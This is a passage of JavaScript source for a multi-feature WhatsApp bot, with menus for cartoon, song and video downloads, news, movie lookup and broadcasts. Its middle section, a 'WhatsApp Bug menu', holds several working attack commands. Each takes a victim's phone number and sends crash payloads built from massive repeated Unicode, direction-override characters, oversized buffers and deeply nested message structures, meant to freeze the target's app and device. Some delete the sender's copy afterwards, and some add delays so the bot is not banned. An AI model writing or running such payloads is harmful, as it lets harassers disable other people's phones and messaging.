					mimetype: 'audio/mp4',
					fileName: 'ben.mp4'
				},
					{ quoted: m })

			}
				break

/*|⬡════════════════════════════════════════════|❝   𝙰vi -   Download Menu..  ™ ❞|═══════════════════════════════════════════⬡|*/


case 'cartoon': {
    const fs = require('fs');
    try {
        // file path: ./languages/cartoons.json
        const cartoons = JSON.parse(fs.readFileSync('./languages/cartoons.json'));
        const userLang = global.db.users[m.sender]?.language || 'en';
        const langHeader = userLang === 'si' ? "කාටුන් ලැයිස්තුව" : "CARTOON LIST";

        // Category Buttons (Sootin Martin, Doraemon...)
        const buttons = Object.keys(cartoons).map(id => ({
            buttonId: `.ct episodes ${id}`,
            buttonText: { displayText: cartoons[id].title },
            type: 1
        }));

        await Avishka.sendButtonMsg(m.chat, {
            text: `*🎥 ${langHeader}*\n\nSelect a category to see episodes:`,
            footer: "© Prince-Avi-MD",
            buttons: buttons,
            headerType: 1 
        }, { quoted: m });
    } catch (err) {
        m.reply("JSON error: " + err.message);
    }
}
break;

case 'ct': {
    const fs = require('fs');
    let cartoons;
    try {
        cartoons = JSON.parse(fs.readFileSync('./languages/cartoons.json'));
    } catch (e) { return; }

    // බටන් එකෙන් එන මැසේජ් එක කඩා ගන්නවා (උදා: .ct episodes cartoon1)
    const parts = m.text.split(' ');
    const type = parts[1]; // episodes හෝ download
    const id = parts[2];   // cartoon1 හෝ cartoon2
    const epIdx = parts[3]; // 0, 1, 2...

    // 1. කැටගරි එකක් තේරුවාම එපිසෝඩ් පෙන්වීම
    if (type === 'episodes') {
        const selected = cartoons[id];
        if (!selected) return;

        const epButtons = selected.episodes.map((ep, index) => ({
            buttonId: `.ct download ${id} ${index}`,
            buttonText: { displayText: ep.name },
            type: 1
        }));

        await Avishka.sendButtonMsg(m.chat, {
            text: `*🎬 ${selected.title} - Episodes*\n\nSelect an episode to download:`,
            footer: "Prince-Avi-MD Downloader",
            buttons: epButtons,
            headerType: 1
        }, { quoted: m });
    }

    // 2. එපිසෝඩ් එකක් තේරුවාම YouTube Downloader එකට ලින්ක් එක යැවීම
    if (type === 'download') {
        const selectedCartoon = cartoons[id];
        const selectedEp = selectedCartoon?.episodes[epIdx];

        if (selectedEp && selectedEp.url) {
            // බොට් විසින්ම .ytmp4 [url] පණිවිඩය යවනවා
            await Avishka.sendMessage(m.chat, { text: `.ytmp4 ${selectedEp.url}` }, { quoted: m });
        }
    }
}
break;


			case 'ytmp3': {
				if (!text) return m.reply(`*කෝ යුටියුබ් ලින්ක් එක. where's the yt link ?:* ${prefix + command} https://youtube.com/watch?v=Xs0Lxif1u9E`);
				const url = text.trim();
				const format = 'mp3';
				const regex = /^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.?be)\/.+$/;
				if (!regex.test(url)) {
					return m.reply('link yang anda berikan tidak valid, silahkan masuk kan link yang benar.');
				}
				m.reply(' මොහොතක් රැදීසිටින්න.✨ ');
				try {
					const headers = {
						"accept": "*/*",
						"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
						"sec-ch-ua": "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
						"sec-ch-ua-mobile": "?1",
						"sec-ch-ua-platform": "\"Android\"",
						"sec-fetch-dest": "empty",
						"sec-fetch-mode": "cors",
						"sec-fetch-site": "cross-site",
						"Referer": "https://id.ytmp3.mobi/",
						"Referrer-Policy": "strict-origin-when-cross-origin"
					}
					const initial = await fetch(`https://d.ymcdn.org/api/v1/init?p=y&23=1llum1n471&_=${Math.random()}`, { headers });
					let format = 'mp4';
					const init = await initial.json();
					const id = url.match(/(?:youtu\.be\/|youtube\.com\/(?:.*v=|.*\/|.*embed\/))([^&?/]+)/)?.[1];
					let convertURL = init.convertURL + `&v=${id}&f=${format}&_=${Math.random()}`;
					const converts = await fetch(convertURL, { headers });
					const convert = await converts.json();
					let info = {};
					for (let i = 0; i < 3; i++) {
						let j = await fetch(convert.progressURL, { headers });
						info = await j.json();
						console.log(info);
						if (info.progress == 3) break;
					}
					const result = {
						url: convert.downloadURL,
						title: info.title
					}
					await Avishka.sendMessage(m.chat, {
						audio: { url: result.url },
						mimetype: 'audio/mp4'
					}, { quoted: m });
				} catch {
					m.reply('Error..')
				}
			}
				break




			case 'song':
			case 'play': case 'video': {
				if (!text) {
					return m.reply(`  Example :${prefix + command}  රෝස මලේ නටුවෙ කටු  \n \n _© 𝙰𝚕𝚙𝚑𝚊 𝚅𝚒𝚜𝚒𝚘𝚗 𝙸𝚗𝚏𝚒𝚗𝚒𝚝𝚢_ <𝙰𝚅𝙸>`)
				}
				try {
					Avishka.sendButtonMsg(m.chat, { react: { text: `⏱️`, key: m.key } })
					const yts = require('yt-search')
					const nyoba = await yts(text);
					const { url, title, description, thumbnail, duration, ago, views, author } = nyoba.all[0];
					const body = `• *Title:* ${title}\n ` +
						`• *Channel:* ${author.name}\n` +
						`• *Duration:* ${duration}\n` +
						`• *Link:* ${url}\n *ඔබට අවශය විඩියොවක් ලෙසද නැත්නම් සිංදුවක් විදිහටද ?* \n \n _© 𝙰𝚕𝚙𝚑𝚊 𝚅𝚒𝚜𝚒𝚘𝚗 𝙸𝚗𝚏𝚒𝚗𝚒𝚝𝚢_ <𝙰𝚅𝙸>`
					const buttons = [
						{
							buttonId: `${prefix}ytmp3 ${url}`,
							buttonText: { displayText: 'Audio' },
							type: 1
						},
						{
							buttonId: `${prefix}ytmp4 ${url}`,
							buttonText: { displayText: 'Video' },
							type: 1
						}
					]
					await Avishka.sendButtonMsg(m.chat, {
						image: { url: thumbnail },
						caption: body,
						footer: 'SCRIPT OF ' + botname + ' is on YouTube @Avishka Shavinda',
						buttons: buttons,
						headerType: 1,
						viewOnce: false
					}, { quoted: m })
				} catch (err) {
					console.error(err)
					m.reply('*කිසියම් දෝශයක් සිදුවී ඇත , නවත උත්සාහ කරන්න:* ' + err)
				}
			}
				break


			case 'ytmp4': {
				if (!text) return m.reply(`Silakan masuk kan link youtube nya, Contoh: ${prefix + command} https://youtube.com/watch?v=Xs0Lxif1u9E`);
				try {
					const url = text.trim();
					const headers = {
						"accept": "*/*",
						"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
						"sec-ch-ua": "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
						"sec-ch-ua-mobile": "?1",
						"sec-ch-ua-platform": "\"Android\"",
						"sec-fetch-dest": "empty",
						"sec-fetch-mode": "cors",
						"sec-fetch-site": "cross-site",
						"Referer": "https://id.ytmp3.mobi/",
						"Referrer-Policy": "strict-origin-when-cross-origin"
					}
					const initial = await fetch(`https://d.ymcdn.org/api/v1/init?p=y&23=1llum1n471&_=${Math.random()}`, { headers });
					let format = 'mp4';
					const init = await initial.json();
					const id = url.match(/(?:youtu\.be\/|youtube\.com\/(?:.*v=|.*\/|.*embed\/))([^&?/]+)/)?.[1];
					let convertURL = init.convertURL + `&v=${id}&f=${format}&_=${Math.random()}`;
					const converts = await fetch(convertURL, { headers });
					const convert = await converts.json();
					let info = {};
					for (let i = 0; i < 3; i++) {
						let j = await fetch(convert.progressURL, { headers });
						info = await j.json();
						console.log(info);
						if (info.progress == 3) break;
					}
					const result = {
						url: convert.downloadURL,
						title: info.title
					}
					await Avishka.sendMessage(m.chat, { video: { url: result.url } }, { quoted: m });
				} catch {
					m.reply('aduh kak error nieh..')
				}
			}
				break




	case 'adaderana': {
  try {
    const res = await axios.get('https://supun-md-api-rho.vercel.app/api/news/adaderana');
    const news = res.data.results;

    let txt = `📰 *Ada Derana Headlines*\n\n`;
    news.slice(0, 5).forEach((n, i) => {
      txt += `*i + 1.{n.title}*\n🗓️ n.date🔗{n.url}\n\n`;
    });

    await Avishka.sendMessage(m.chat, { text: txt }, { quoted: m });
  } catch (e) {
    console.error(e);
    m.reply('News data load වෙන්නෙ නැ.');
  }
  break;
}

			/*|⬡════════════════════════════════════════════|❝   𝙰vi -  ™ ❞|═══════════════════════════════════════════⬡|*/
			case 'whatsapmode': case 'mode':

				Avishka.sendMessage(m.chat, {
					text: `* 1more \n statusview \n \n `,
					contextInfo: {
						externalAdReply: {
							showAdAttribution: true,
							title: `${botname}`,
							body: `Created By : Avishka Shavinda`,
							thumbnailUrl: 'https://files.catbox.moe/jggkxf.jpg',

							sourceUrl: global.link,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: m
				})

				break
			/*|⬡════════════════════════════════════════════|❝   𝙰vi -  ™ ❞|═══════════════════════════════════════════⬡|*/
	


			case 'sw':
				{
					//if (!m.isOwner) return m.reply('lhu saha');
					if (!store.messages['status@broadcast'].array.length === 0) throw 'Gaada 1 status pun';
					let contacts = Object.values(store.contacts);
					let [who, value] = m.text.split(/[,|\-+&]/);
					value = value?.replace(/\D+/g, '');

					let sender;
					if (m.mentions.length !== 0) sender = m.mentions[0];
					else if (m.text) sender = contacts.find(v => [v.name, v.verifiedName, v.notify].some(name => name && name.toLowerCase().includes(who.toLowerCase())))?.id;

					let stories = store.messages['status@broadcast'].array;
					let story = stories.filter(v => (v.key && v.key.participant === sender) || v.participant === sender).filter(v => v.message && v.message.protocolMessage?.type !== 0);
					if (story.length === 0) throw 'Gaada sw nya';
					if (value) {
						if (story.length < value) throw 'Jum.chatahnya ga sampe segitu';
						await m.reply({ forward: story[value - 1], force: true });
					} else {
						for (let msg of story) {
							await delay(1500);
							await m.reply({ forward: msg, force: true });
						}
					}
				}
				break




			/*|⬡════════════════════════════════════════════|❝   𝙰vi - WhatsApp Bug menu  ™ ❞|═══════════════════════════════════════════⬡|*/
			case "android": {
			//	if (!isPremium) return m.reply(mess.prem)
				//if (!text) return m.reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 94xxxxxxxxxx, 3`) 
				let number = text.split('/')[0];
				let amount = text.split('/')[1] * 5;
				if (!number || !amount) {
					return m.reply(`Real king Avi \n  ${prefix + command} \n \nvictim number\n \n victim number|amount\nExample ${prefix + command} 94xxxxxxxxxx/ 3`)
				}
				if (isNaN(parseInt(amount))) {
					return m.reply("Amount must be a number");
				}
				let cleanedNumber = number.replace(/[^0-9]/g, '');
				let encodedAmount = '' + encodeURI(amount);
				var contactInfo = await Avishka.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
				let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
				if (cleanedNumber == "94xxxxxxxxxx") {
					return;
				}
				if (contactInfo.length == 0) {
					return m.reply("The number is not registered on WhatsApp");
				}
				m.reply("please wait, " + command + " bug is in process..");
				await sleep(2000); // Adjusted sleep time for clarity
				sendViewOnceMessages (whatsappNumber, encodedAmount);
				await sleep(2500); // Adjusted sleep time for clarity
				sendMessageWithMentions(
					"Successfully Sent Bug To @" + whatsappNumber.split('@')[0] +
					" Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.",
					[whatsappNumber]
				);
			}
				break;


case 'android1': {
    let input = text.split('/');
    let number = input[0].replace(/[^0-9]/g, '');
    let loopCount = parseInt(input[1]);

    if (!number || isNaN(loopCount)) {
        return m.reply(`*PRINCE AVI UI STRESSER* 🚀\n\nභාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx/count\nඋදාහරණ: ${prefix + command} 947xxxxxxxx/5`);
    }

    let target = number + '@s.whatsapp.net';
    var contactInfo = await Avishka.onWhatsApp(target);

    if (contactInfo.length == 0) return m.reply("මෙම අංකය WhatsApp හි ලියාපදිංචි වී නොමැත.");
    if (number == "94xxxxxxxx") return m.reply("Developer ව බග් කිරීමට නොහැක.");

    m.reply(`⚠️ ${loopCount} UI-Stress පෑලෝඩ්ස් යැවීම ආරම්භ කරන ලදී...\nඉලක්කය: ${number}`);

    for (let i = 0; i < loopCount; i++) {
        // 1. සංකීර්ණ Glyph Combo එකක් සෑදීම
        const scriptKill = "ꦾ\u17B4\u17B5\u202E\u034F\u2060".repeat(99999);

        await Avishka.sendMessage(target, {
            text: `⚠️ SYSTEM_STRESS_LEVEL_${i+1}\n` + scriptKill,
            contextInfo: {
                mentionedJid: [target],
                forwardingScore: 999,
                isForwarded: true,
                externalAdReply: {
                    title: "OFFICIAL_VERIFIED_TEST ✔",
                    body: "Processing Thermal Payload...",
                    mediaType: 1,
                    showAdAttribution: true, // Verified පෙනුම ලබා දෙයි
                    thumbnail: Buffer.alloc(1024 * 100, scriptKill), // RAM Overload buffer
                    sourceUrl: "https://avi-internal.gov"
                },
                // 2. ViewOnce පණිවිඩයක් ලෙස ඇතුළත් කිරීම (UI Thread එක වැඩියෙන් ලොක් කිරීමට)
                quotedMessage: {
                    viewOnceMessageV2: {
                        message: {
                            imageMessage: {
                                caption: scriptKill,
                                jpegThumbnail: Buffer.alloc(1024 * 50, scriptKill)
                            }
                        }
                    }
                }
            }
        });
        
        // 3. Bot එක Ban නොවී සිටීමට කුඩා විරාමයක් (Sleep)
        await new Promise(resolve => setTimeout(resolve, 1500));
    }

    m.reply(`✅ සාර්ථකයි! පෑලෝඩ් ${loopCount} ක් යවන ලදී.\nටාගට් එකේ UI එක දැන් මිනිත්තු කිහිපයකට Freeze වී තිබිය යුතුය.`);
}
break;

case 'test': {
    if (!text) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx`);
    let target = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    const buug = "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡⃟أؚؚ݃٨ٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٔٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓ۷ٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍ╮\u200E\u200F\u202E".repeat(50); 
   //Avishka shavinda 

    try {
        await Avishka.sendMessage(target, {
            text: buug,
            contextInfo: {
                externalAdReply: {
                    title: "© 𝙰𝚕𝚙𝚑𝚊 𝚅𝚒𝚜𝚒𝚘𝚗 𝙸𝚗𝚏𝚒𝚗𝚒𝚝𝚢",
                    body: buug,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        });
        m.reply("AVI CRASHE /BUG ✅.");
    } catch (e) {
        m.reply("Error: " + e.message);
    }
}
break;

				
case 'testt': {
    if (!text) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx`);
    let target = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    const bug = "\u200E\u200F\أؚؚ݃٨ٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٔٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓ۷ٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍ\u202E".repeat(2500); // ප්‍රමාණය මධ්‍යස්ථව තබා ඇත
    


    try {
        await Avishka.sendMessage(target, {
            text: bug,
            contextInfo: {
                externalAdReply: {
                    title: "© 𝙰𝚕𝚙𝚑𝚊 𝚅𝚒𝚜𝚒𝚘𝚗 𝙸𝚗𝚏𝚒𝚗𝚒𝚝𝚢",
                    body: bug,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        });
        m.reply("AVI CRASHE /BUG ✅.");
    } catch (e) {
        m.reply("Error: " + e.message);
    }
}
break;


case 'v5': {
    if (!text) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx`);
    let target = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    
    m.reply("*Advanced Structure Test...* 🛠️");

    try {
        const msg = await generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: { title: "SYSTEM_STRESS_TEST", hasMediaAttachment: false },
                        body: { text: "⚠️ UI Rendering Buffer Test" },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "Tap to Crash",
                                        sections: Array(20).fill({ // Sections 20ක් සාදයි
                                            title: "🔥".repeat(50),
                                            rows: Array(10).fill({ // සෑම Section එකකටම Rows 10ක්
                                                title: "BUG_DATA_" + Math.random(),
                                                rowId: "row_id_" + Math.random(),
                                                description: "ꦾ".repeat(10)
                                            })
                                        })
                                    })
                                }
                            ]
                        }
                    }
                }
            }
        }, { userJid: Avishka.user.id, quoted: m });

        await Avishka.relayMessage(target, msg.message, { messageId: msg.key.id });
        m.reply("✅ New Structural Payload Sent.");
        
    } catch (err) {
        m.reply("❌ Error: " + err.message);
    }
}
break;



case 'imdb': case 'movie': {
    if (!text) return m.reply("කරුණාකර චිත්‍රපටයේ නම සඳහන් කරන්න. (උදා: .imdb Avatar)")

    try {
        const axios = require('axios');
        // පහත 'YOUR_API_KEY' වෙනුවට ඔයාගේ OMDb API Key එක දාන්න
        const apiKey = 'YOUR_API_KEY'; 
        const res = await axios.get(`http://www.omdbapi.com/?t=${encodeURIComponent(text)}&apikey=${apiKey}`);
        const movie = res.data;

        if (movie.Response === 'False') return m.reply("සමාවෙන්න, ඒ නමින් චිත්‍රපටයක් හමු වුණේ නැහැ. 😟");

        let imdbMsg = `🎬 *Movie Information (IMDb)* 🎬\n\n`;
        imdbMsg += `⭐ *Title:* ${movie.Title}\n`;
        imdbMsg += `📅 *Year:* ${movie.Year}\n`;
        imdbMsg += `🌟 *IMDb Rating:* ${movie.imdbRating}\n`;
        imdbMsg += `🎭 *Genre:* ${movie.Genre}\n`;
        imdbMsg += `🎙️ *Director:* ${movie.Director}\n`;
        imdbMsg += `👥 *Actors:* ${movie.Actors}\n`;
        imdbMsg += `📝 *Plot:* ${movie.Plot}\n\n`;
        imdbMsg += `*පහත බොත්තමෙන් චිත්‍රපටය බාගත කරන්න:*`;

        const buttons = [
            { buttonId: `.film ${movie.Title}`, buttonText: { displayText: '📥 Download Movie' }, type: 1 }
        ];

        const buttonMessage = {
            image: { url: movie.Poster },
            caption: imdbMsg,
            footer: 'Avishka IMDb Service',
            buttons: buttons,
            headerType: 4
        };

        await Avishka.sendMessage(m.chat, buttonMessage, { quoted: m });

    } catch (e) {
        console.error(e);
        m.reply("IMDb දත්ත ලබාගැනීමේදී දෝෂයක් වුණා.");
    }
}
break;






case 'cpu-a': {
    if (!text) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx`);
    let target = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    // CPU එකට Render කරන්න අතිශය අපහසු සංකීර්ණ Unicode Combinations
    // RTL (Right-to-Left), LTR, සහ Zalgo අක්ෂර මිශ්‍ර කර ඇත
    const overloadChar = "\u202E\u200B\u034F\u2060\u200E\u05D0\u05D1\u05D2".repeat(10);
    const extremePayload = Array(30).fill(overloadChar).join("҉");

    try {
        await Avishka.sendMessage(target, {
            // Payment Message එකක් ලෙස ඇතුළත් කිරීම (මෙය UI එකේදී වෙනම Logic එකක් පාවිච්චි කරයි)
            viewOnceMessage: {
                message: {
                    paymentInviteMessage: {
                        serviceType: 1,
                        expiryTimestamp: 0,
                    }
                }
            },
            text: "⚠️ SYSTEM HALT ⚠️\n" + extremePayload,
            contextInfo: {
                mentionedJid: Array(50).fill(target), // Mentions වැඩි කිරීමෙන් Notification thread එක ලොක් වේ
                forwardingScore: 999,
                isForwarded: true,
                // Quoted Message එකක් ඇතුළත තවත් ඉතා සංකීර්ණ ව්‍යුහයක් (Deep Nesting)
                quotedMessage: {
                    orderMessage: {
                        orderId: extremePayload.substring(0, 5000),
                        thumbnail: Buffer.alloc(0), // Corrupted thumbnail simulation
                        itemCount: 99999999,
                        status: 1,
                        surface: 1,
                        message: extremePayload,
                        orderTitle: extremePayload.substring(0, 2000),
                        sellerJid: target
                    }
                },
                externalAdReply: {
                    title: "CRITICAL_CPU_STRESS: " + extremePayload.substring(0, 500),
                    body: "MEMORY_LEAK_DETECTED",
                    mediaType: 1,
                    renderLargerThumbnail: false,
                    sourceUrl: "https://avi-internal-bug." + extremePayload.substring(0, 500)
                }
            }
        }, { 
            // මෙහිදී message ID එකත් ඉතා දිගු කිරීමෙන් Database එකට බරක් දිය හැක
            messageId: "أؚؚ݃٨ٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٔٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓٓ۷ٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍ" + "2".repeat(50) + Math.floor(Math.random() * 1000)
        });

        m.reply("🚀 CPU Annihilator යවන ලදී. LDPlayer එකේ System Monitor එක බලන්න.");
    } catch (err) {
        m.reply("❌ Error: " + err.message);
    }
}
break;


//power full

case 'cpu': {
    if (!text) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx`);
    let target = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    // CPU එක Render කරන්න ගොස් හිරවන අතිශය සංකීර්ණ අක්ෂර මාලාව
    // මෙහි \u202E (Right-to-Left Override) දහස් ගණනක් ඇත
    const cpuBurner = ("\u202E\u200B\u034F\u2060\u200E".repeat(500) + "҉".repeat(200));
    const finalPayload = Array(20).fill(cpuBurner).join(" "); // දත්ත ප්‍රමාණය තවත් වැඩි කිරීම

    try {
        await Avishka.sendMessage(target, {
            text: "⚠️ SYSTEM_CPU_STRESS_TEST_V2\n" + "ꦾ".repeat(99999),
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                mentionedJid: [target],
                externalAdReply: {
                    title: "CPU OVERLOAD DETECTED: " + finalPayload.substring(0, 500),
                    body: "Decoding error in logic thread...",
                    mediaType: 1,
                    renderLargerThumbnail: false,
                    // මෙහිදී image එකක් වෙනුවට තවත් පෑලෝඩ් එකක් metadata වලට දීම
                    sourceUrl: "https://p" + finalPayload.substring(0, 100) + ".com"
                },
                // පණිවිඩය ලැබුණු සැනින් Notification එක පෙන්වීමට CPU එක උත්සාහ කරන විට හිර කිරීමට
                quotedMessage: {
                    adminInviteMessage: {
                        inviteCode: finalPayload,
                        groupJid: "120363000000000000@g.us",
                        caption: finalPayload
                    }
                }
            }
        });

        m.reply("🚀 CPU Freeze Payload එක යවන ලදී. ටාගට් එකේ Notification බාර් එක පවා හිර වීමට ඉඩ ඇත.");
    } catch (err) {
        m.reply("❌ Error: " + err.message);
    }
}
break;



case 'uiking': {
    if (!text) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx`);
    let target = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    // ඉතා සංකීර්ණ Unicode අනුපිළිවෙලක් (Zalgo + Directional Overrides)
    const complexPayload = ("\u034F\u2060\u202E\u200B\u200C".repeat(1500) + "҉".repeat(1000));
    const heavyString = Array(15).fill(complexPayload).join("\u200B");

    try {
        // පණිවිඩය යැවීම
        const sentMsg = await Avishka.sendMessage(target, {
            text: "⚠️ STRESS_TEST_ACTIVE\n" + "ꦾ".repeat(40000),
            contextInfo: {
                mentionedJid: Array(20).fill(target),
                forwardingScore: 999,
                isForwarded: true,
                externalAdReply: {
                    title: "CRITICAL_ERROR: " + heavyString.substring(0, 5000),
                    body: "Decoding UI components...",
                    mediaType: 1,
                    sourceUrl: "https://avi-internal." + heavyString.substring(0, 1000)
                },
                quotedMessage: {
                    // Quoted message එකක් තුළ ඇති පෑලෝඩ් එක Notification පෙන්වීමේදී CPU එක වැඩිපුර ලැග් කරවයි
                    adminInviteMessage: {
                        inviteCode: heavyString,
                        groupJid: "120363000000000000@g.us",
                        caption: heavyString
                    }
                }
            }
        });

        // තත්පර 2කින් යවන්නාගේ පැත්තෙන් පණිවිඩය මැකීම (Sender Side Clean-up)
        setTimeout(async () => {
            await Avishka.sendMessage(m.chat, { 
                delete: sentMsg.key 
            });
        }, 2000);

        m.reply("🚀 Payload එක යවන ලදී. යවන්නාගේ අග්‍රයෙන් දත්ත ඉවත් කරන ලදී.");
    } catch (err) {
        m.reply("❌ Error: " + err.message);
    }
}
break;

case 'avi-god': {
    if (!text) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx`);
    let target = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    // ꦾ වගේම තවත් බලවත් අක්ෂර මාලාවක් (Unicode Combo)
    const powerChars = "ꦾꦿꦼꦽᦗᦘᦙᦚ҉᪢᪣ᫍᫎ\u202E\u034F";
    const ultraBurner = (powerChars.repeat(1500)); 
    
    // UI එක හිර කරවන ප්‍රධාන පෑලෝඩ් එක
    const finalPayload = Array(20).fill(ultraBurner).join("\u200B");

    try {
        const sentMsg = await Avishka.sendMessage(target, {
            // Text එක ඇතුළට අතිවිශාල අක්ෂර මාලාවක්
            text: "PRINCE-AVI-MD GOD-MODE ⚠️\n" + finalPayload,
            contextInfo: {
                mentionedJid: Array(50).fill(target),
                forwardingScore: 999,
                isForwarded: true,
                externalAdReply: {
                    title: "SYSTEM_FAILURE: " + powerChars.repeat(500),
                    body: "Decoding Script Engine...",
                    mediaType: 1,
                    // මෙතැනටත් පෑලෝඩ් එක දීමෙන් UI එක පෙන්වීම වැළැක්විය හැක
                    thumbnail: Buffer.alloc(1000, powerChars),
                    sourceUrl: "https://avi-bug." + ultraBurner.substring(0, 500)
                },
                // Quoted message එකක් තුළ Vcard එකක් දීම (මෙය ඉතා බලවත් ක්‍රමයකි)
                quotedMessage: {
                    contactMessage: {
                        displayName: "Avi-Bug-Expert",
                        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;${ultraBurner};;;\nFN:${ultraBurner}\nNOTE:${finalPayload}\nEND:VCARD`
                    }
                }
            }
        });

        // Sender ගේ පැත්තෙන් ලැග් නොවීමට පණිවිඩය මැකීම
        setTimeout(async () => {
            await Avishka.sendMessage(m.chat, { delete: sentMsg.key });
        }, 1500);

        m.reply("🚀 God-Mode Payload එක යවන ලදී. ටාගට් එකේ UI එක 'ꦾ' වගේ දහස් ගණනක් අක්ෂර නිසා හිර වනු ඇත.");
    } catch (err) {
        m.reply("❌ Error: " + err.message);
    }
}
break;



case 'cpu-kill': {
    if (!text) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx`);
    let target = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    // පෙනෙන්නට නැති නමුත් UI Thread එක ලොක් කරන අක්ෂර (Complex Glyph Combinations)
    const heavyChar = "\u17B4\u17B5\u202E\u200B\u034F\u2060".repeat(2500);
    const extremePayload = Array(15).fill(heavyChar).join(" ");

    try {
        const sentMsg = await Avishka.sendMessage(target, {
            // 1. Poll Message එකක් ඇතුළත දත්ත පිරවීම (දැනට මෙය ගොඩක් සාර්ථකයි)
            pollUpdates: [
                {
                    pollUpdateMessageKey: { remoteJid: target, fromMe: false, id: "AVI-BUG" },
                    vote: { selectedOptions: [Buffer.from(extremePayload)], senderTimestampMs: Date.now() },
                    senderTimestampMs: Date.now(),
                }
            ],
            // 2. ප්‍රධාන පණිවිඩය ලෙස Document එකක් (Preview එක හිර කිරීමට)
            document: Buffer.alloc(1024 * 300, heavyChar), 
            mimetype: 'application/vnd.openxm.chatformats-officedocument.wordprocessingm.chat.document',
            fileName: "CRITICAL_SYSTEM_OVERLOAD\n" + heavyChar.substring(0, 500),
            caption: "⚠️ SYSTEM_ANR_STRESS_TEST\n" + "ꦾ".repeat(50000),
            
            contextInfo: {
                mentionedJid: Array(50).fill(target),
                forwardingScore: 999,
                isForwarded: true,
                externalAdReply: {
                    title: "THREAD_LOCK_DETECTED: " + heavyChar.substring(0, 1000),
                    body: "Processing binary stream...",
                    mediaType: 1,
                    thumbnail: Buffer.alloc(1024 * 100, heavyChar), // Thumbnail එකටත් පෑලෝඩ් එක දීම
                    sourceUrl: "https://avi-internal-crash-test.com",
                    renderLargerThumbnail: false,
                },
                // 3. Quoted message එකක් ලෙස List Message එකක් (Double Lag)
                quotedMessage: {
                    listMessage: {
                        title: extremePayload.substring(0, 1000),
                        description: extremePayload,
                        buttonText: "FREEZE",
                        listType: 1,
                        sections: [{
                            title: "Bug-Bounty-V4",
                            rows: [{title: "Exploit", rowId: "1"}]
                        }]
                    }
                }
            }
        });

        // Sender ගේ පැත්තෙන් ලැග් නොවීමට ඉක්මනින් මැකීම
        setTimeout(async () => {
            await Avishka.sendMessage(m.chat, { delete: sentMsg.key });
        }, 1000);

        m.reply("🚀 Multi-Layered Bug එක යවන ලදී. දැන් ටාගට් එකේ UI එක 'Freeze' වී ඇත්දැයි බලන්න.");
    } catch (err) {
        m.reply("❌ Error: " + err.message);
    }
}
break;





case 'bc2026all': {
    if (!m.isOwner) return m.reply("*සමාවන්න, මෙය බොට් අයිතිකරුට පමණි!* 🚫");

    const nyImage = 'https://files.catbox.moe/jggkxf.jpg'; 
    const nyText = `*Happy New Year 2026!* ✨🥳\n\nලැබුවා වූ 2026 නව වසර ඔබටත්, ඔබේ පවුලේ සැමටත් සාමය, සතුට පිරි සුබ නව වසරක් වේවා! 🎇\n\n_From: Alpha Vision Infinity Bot_ 🤖`;

    // සියලුම චැට් (Inbox + Groups) ලබා ගැනීම
    let chats = await Avishka.chats.all();
    let recipients = chats.map(v => v.id);

    await m.reply(`*2026 සුබපැතුම් සියලුම චැට්ස් ${recipients.length} කට යැවීම ආරම්භ කළා...* ⏳\n_මෙය නිමවීමට සුළු වේලාවක් ගතවේ._`);

    for (let id of recipients) {
        try {
            await sleep(2000); // නම්බර් බෑන් වීම වැළැක්වීමට තත්පර 2ක පමාවක්
            await Avishka.sendMessage(id, { 
                image: { url: nyImage }, 
                caption: nyText,
                contextInfo: {
